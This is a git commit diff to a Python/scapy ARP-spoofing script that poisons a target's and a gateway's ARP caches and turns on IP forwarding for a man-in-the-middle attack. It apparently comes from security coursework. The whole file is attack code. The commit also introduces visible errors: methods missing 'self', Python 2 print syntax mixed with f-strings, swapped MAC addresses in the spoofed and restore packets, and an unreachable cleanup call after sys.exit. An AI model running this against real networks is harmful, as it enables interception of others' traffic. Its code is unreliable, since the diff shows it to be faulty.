9875ab54f55d2aed7648c2cd9d9343bb5bcd2f5a
András Tarlós <andras.tarlos@ost.ch>
2025-11-11 11:29:50 +0100

    Enable and disable IP forwarding

--- arp_spoof.py
+++ arp_spoof.py
@@ -3,12 +3,11 @@ import sys
 import logging
 import argparse
 import os
-from scapy.all import ARP, send, get_if_hwaddr, get_if_addr
-
+from scapy.all import *
 
 class ARPSpoofer:
     def __init__(self, target_ip, gateway_ip, interface):
-        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        self.enable_ip_forwarding()
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface
@@ -17,6 +16,14 @@ class ARPSpoofer:
         self.gateway_mac = self.get_mac(gateway_ip)
         print(self.gateway_mac)
         self.own_mac = get_if_hwaddr(self.interface)
+    
+    def enable_ip_forwarding():
+        print "\n[*] Enabling IP Forwarding...\n"
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+    def disable_ip_forwarding():
+        print "[*] Disabling IP Forwarding..."
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
     def get_mac(self, ip):
         request = scapy.ARP(pdst=ip)
@@ -27,20 +34,20 @@ class ARPSpoofer:
         return mac
 
     def spoof(self):
-        spoofed_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.target_mac)
-        spoofed_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
+        spoofed_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.gateway_mac)
+        spoofed_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.target_mac)
         send(spoofed_target, verbose=False)
         send(spoofed_gateway, verbose=False)
         logging.info(f"Sent spoofed ARP responses to {self.target_ip} and {self.gateway_ip}")
 
     def restore(self):
         restore_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac)
-        restore_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.own_mac)
+        restore_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac)
         send(restore_target, count=5, verbose=False)
         send(restore_gateway, count=5, verbose=False)
         logging.info("Restored the network")
 
-    def run(self):
+    def mitm(self):
         try:
             while True:
                 self.spoof()
@@ -48,7 +55,7 @@ class ARPSpoofer:
         except KeyboardInterrupt:
             self.restore()
             sys.exit("ARP spoofing stopped")
-            os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+            self.disable_ip_forwarding()
 
 
 if __name__ == "__main__":
@@ -63,4 +70,4 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     spoofer = ARPSpoofer(target_ip=args.target, gateway_ip=args.gateway, interface=args.interface)
-    spoofer.run()
+    spoofer.mitm()
